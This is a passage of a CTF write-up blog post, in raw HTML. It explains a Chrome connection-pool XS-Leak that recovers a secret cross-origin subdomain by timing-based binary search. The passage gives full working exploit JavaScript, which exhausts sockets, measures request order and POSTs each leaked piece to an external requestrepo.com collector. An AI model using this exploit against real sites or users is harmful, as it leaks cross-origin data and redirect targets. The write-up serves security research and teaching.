2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515.0 6.445-2.148 6.64-4.883z"/></svg>
+</span>Note</p><p>Note: <code>window.onhashchange</code> wasn&rsquo;t required to solve the challenge, but it made the exploitation easier.</p></div><h3 id=content-security-policy><a class=full-clickable-heading href=#content-security-policy>Content Security Policy</a></h3><p>The server also sends a strict CSP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>nonce</span> <span class=o>=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>16</span><span class=p>).</span><span class=nx>toString</span><span class=p>(</span><span class=s1>&#39;base64&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>nonce</span> <span class=o>=</span> <span class=nx>nonce</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span><span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>,</span> <span class=sb>`default-src &#39;none&#39;; script-src &#39;nonce-</span><span class=si>${</span><span class=nx>nonce</span><span class=si>}</span><span class=sb>&#39;; connect-src *.</span><span class=si>${</span><span class=nx>DOMAIN</span><span class=si>}</span><span class=sb>; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></div><p>So network requests are restricted to <code>*.${DOMAIN}:${PORT}</code> (<code>connect-src</code>) and framing is blocked both ways: the page can&rsquo;t create frames and it cannot be embedded by others (<code>frame-ancestors 'none'</code>)</p><h3 id=route-report><a class=full-clickable-heading href=#route-report>Route /report</a></h3><p>The bot simulates a user (or admin) using Chrome:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>try</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`The admin will visit </span><span class=si>${</span><span class=nx>SITE</span><span class=si>}</span><span class=sb> first, and then </span><span class=si>${</span><span class=nx>url</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>SITE</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;domcontentloaded&#34;</span><span class=p>,</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>evaluate</span><span class=p>((</span><span class=nx>flag</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>localStorage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=nx>flag</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=nx>FLAG</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`localStorage.setItem(&#39;flag&#39;, &#39;</span><span class=si>${</span><span class=nx>FLAG</span><span class=si>}</span><span class=sb>&#39;)`</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>browser</span><span class=p>)</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>reject</span><span class=p>(</span><span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s2>&#34;Error: Setup failed, if this happens consistently on remote contact the admin&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>resolve</span><span class=p>(</span><span class=s2>&#34;The admin will visit your URL soon&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;domcontentloaded&#34;</span><span class=p>,</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5000</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>120_000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>The bot, will:</p><ul><li>visits the challenge site</li><li>stores the flag in the local storage</li><li>Navigates to a supplied URL</li><li>sleeps for 120 seconds</li></ul><h2 id=swimming-in-the-connection-pool-again><a class=full-clickable-heading href=#swimming-in-the-connection-pool-again>Swimming In The Connection Pool (again)</a></h2><p>To solve this challenge, you need to know how Chrome&rsquo;s connection pool works ( background:
+<a href=https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/ rel=noopener>https://xsleaks.dev</a>
+). In short, Chrome can run up to 256 concurrent requests across different origins, but only 6 in parallel to the same origin.</p><p>Chrome schedules by priority first: the request with the highest priority gets a socket (see the priority table
+<a href="https://web.dev/articles/fetch-priority?hl=en#resource-priority" rel=noopener>here</a>
+). But what if two requests have the same priority?</p><p>You might expect FIFO, surprisingly, that&rsquo;s not what happens! When two requests have the same priority, Chrome will sort by port, then scheme, then host. So if two request have the same priority, port and scheme, Chrome will prioritize the one whose host is lexicographically lower (details in my earlier post
+<a href=https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#deep-diving-into-chromium-internals rel=noopener>here</a>
+)</p><p>Example: if request A targets <code>http://google.com:80</code> and request B targets <code>http://example.com:80</code>, <code>http://example.com:80</code> wins and gets the socket first (same port and scheme but <code>example.com</code> &lt; <code>google.com</code>).</p><p>This quirk gives us an oracle. We can &ldquo;guess&rdquo; the unknown subdomain (the one the page fetches) with a binary search: by sending a request to a test host and seeing which request &ldquo;goes first&rdquo;, we can detect wheter our host comes before or after the challenge one alphabetically.</p><blockquote><p>I explained this behaviour in a
+<a href=https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#stalled-requests-priorities--more rel=noopener>previous article</a>
+in a detailed way. Here I&rsquo;ll just cover what we need for the exploit</p></blockquote><h2 id=exploit---leaking-subdomains-of-cross-origin-requests><a class=full-clickable-heading href=#exploit---leaking-subdomains-of-cross-origin-requests>Exploit - Leaking subdomains of cross-origin requests</a></h2><p>Firstly, let&rsquo;s create some functions to setup the connection pool</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// sends a fetch request that takes 360 seconds to finish
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>fetch_sleep_long</span> <span class=o>=</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>controller</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>AbortController</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>signal</span> <span class=o>=</span> <span class=nx>controller</span><span class=p>.</span><span class=nx>signal</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://sleep</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/360?q=</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>signal</span><span class=o>:</span> <span class=nx>signal</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>controller</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// blocks one socket
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>block_socket</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>controller</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>controller</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// exhausts all sockets except one
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>exhaust_sockets</span> <span class=o>=</span> <span class=kr>async</span><span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>SOCKETLIMIT</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>controller</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>block_socket</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>controllers</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>controller</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Then, we need a way to detect which request goes first. My exploit does the following:</p><ul><li>Exhausts the entire pool</li><li>Triggers the challenge&rsquo;s cross-origin request (priority: High)</li><li>Sends our request to <code>&lt;our-guess>&lt;char-to-brute>FFF.attacker.com</code> (same priority as the previous one)</li><li>Frees exactly one socket and immediately sends a request to a host that is always lexicographically smallest (eg. <code>0000.attacker.com</code>) and responds after a measurable delay (eg. ~250ms). Only one of the two passes, the other stalls.</li><li>If the first request completes quickly (&lt; ~250ms), then our host is lexicographically smaller than the challenge one. If it takes much longer, it&rsquo;s greater (> ~600ms).</li><li>Performs a binary search on the unknown subdomain using this oracle</li><li>Repeats until the entire flag is leaked</li></ul><p><img src=/images/leak1.gif loading=lazy decoding=async alt="leak gif"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fetch_leak</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>qq</span><span class=p>,</span> <span class=nx>threshold</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>start</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://</span><span class=si>${</span><span class=nx>qq</span><span class=si>}</span><span class=sb>FFFFFF.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/0?q=</span><span class=si>${</span><span class=nx>qq</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>method</span><span class=o>:</span> <span class=s2>&#34;HEAD&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`fetch_leak(</span><span class=si>${</span><span class=nx>qq</span><span class=si>}</span><span class=sb>) took </span><span class=si>${</span><span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>start</span><span class=si>}</span><span class=sb>ms`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>start</span> <span class=o>&gt;</span> <span class=nx>threshold</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>test</span><span class=p>(</span><span class=nx>leak</span><span class=p>,</span> <span class=nx>w</span><span class=p>,</span> <span class=nx>threshold</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>charset</span> <span class=o>=</span> <span class=s2>&#34;0123456789ABCDEF&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>lo</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>hi</span> <span class=o>=</span> <span class=nx>charset</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>mid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nx>lo</span> <span class=o>&lt;=</span> <span class=nx>hi</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>res_blocker_controller</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=s2>&#34;blocked last socket&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=s2>&#34;changing location&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1>// here the cross-origin request is triggered
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>w</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>TARGET</span><span class=si>}</span><span class=sb>#b`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>midIndex</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>((</span><span class=nx>lo</span> <span class=o>+</span> <span class=nx>hi</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nx>mid</span> <span class=o>=</span> <span class=nx>charset</span><span class=p>[</span><span class=nx>midIndex</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>promise1</span> <span class=o>=</span> <span class=nx>fetch_leak</span><span class=p>(</span><span class=nx>leak</span> <span class=o>+</span> <span class=nx>mid</span><span class=p>,</span> <span class=nx>threshold</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nx>res_blocker_controller</span><span class=p>.</span><span class=nx>abort</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>promise2</span> <span class=o>=</span> <span class=nx>loadFont</span><span class=p>(</span><span class=s2>&#34;asdasd&#34;</span><span class=p>,</span> <span class=sb>`http://000000.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/ssleep/250`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>is_lower</span> <span class=o>=</span> <span class=o>!</span><span class=p>(</span><span class=kr>await</span> <span class=nx>promise1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>promise2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>is_lower</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>lo</span> <span class=o>=</span> <span class=nx>midIndex</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>hi</span> <span class=o>=</span> <span class=nx>midIndex</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=s2>&#34;changing location again&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>w</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>TARGET</span><span class=si>}</span><span class=sb>#a`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>mid</span> <span class=o>=</span> <span class=nx>charset</span><span class=p>[</span><span class=nx>lo</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>mid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>myserver_timing</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>measure_fetch_leak</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>target_timing</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>measure_fetch_target</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>font_timing</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>measure_font</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Threshold: </span><span class=si>${</span><span class=nx>myserver_timing</span> <span class=o>+</span> <span class=nx>target_timing</span> <span class=o>+</span> <span class=nx>font_timing</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>exhaust_sockets</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>start</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>TARGET</span><span class=si>}</span><span class=sb>#a`</span><span class=p>,</span> <span class=s2>&#34;_blank&#34;</span><span class=p>,</span> <span class=s2>&#34;width=800,height=600&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>leak</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span> <span class=c1>// flag{
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=o>!</span><span class=nx>tryDecodeHex</span><span class=p>(</span><span class=nx>leak</span><span class=p>).</span><span class=nx>includes</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Testing for next character... Current leak: </span><span class=si>${</span><span class=nx>leak</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>c</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>test</span><span class=p>(</span><span class=nx>leak</span><span class=p>,</span> <span class=nx>w</span><span class=p>,</span> <span class=nx>myserver_timing</span> <span class=o>+</span> <span class=nx>target_timing</span> <span class=o>+</span> <span class=nx>font_timing</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>c</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=nx>leak</span> <span class=o>+=</span> <span class=nx>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>leak</span> <span class=o>=</span> <span class=nx>leak</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=nx>clear_log</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>(</span><span class=sb>`Leaked: </span><span class=si>${</span><span class=nx>leak</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;https://xxxxxxxxxx.requestrepo.com/&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>body</span><span class=o>:</span> <span class=sb>`</span><span class=si>${</span><span class=nx>leak</span><span class=si>}</span><span class=sb>||</span><span class=si>${</span><span class=nx>tryDecodeHex</span><span class=p>(</span><span class=nx>leak</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>method</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>})</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Final leak: </span><span class=si>${</span><span class=nx>leak</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>(</span><span class=sb>`Time taken: </span><span class=si>${</span><span class=p>(</span><span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>start</span><span class=p>)</span> <span class=o>/</span> <span class=mi>1000</span><span class=si>}</span><span class=sb> seconds`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>main</span><span class=p>();</span>
+</span></span></code></pre></div><p>This leaks the entire flag in ~70s.
+You can find the full exploit
+<a href=https://github.com/salvatore-abello/web-challenges/tree/main/X/salvatoreabello/exploit rel=noopener>here</a></p><p>Flag: <code>flag{gj2e4syr1ght?}</code></p><h3 id=poc><a class=full-clickable-heading href=#poc>PoC</a></h3><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/kEyFQVGotwI?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=leaking-redirect-hosts><a class=full-clickable-heading href=#leaking-redirect-hosts>Leaking redirect hosts</a></h2><p>This technique also lets us leak where a redirect goes. I built a small demo app to illustrate it (source code
+<a href=https://gist.github.com/salvatore-abello/7d4fd69a098e1f80c900747dc1d3dae5 rel=noopener>here</a>
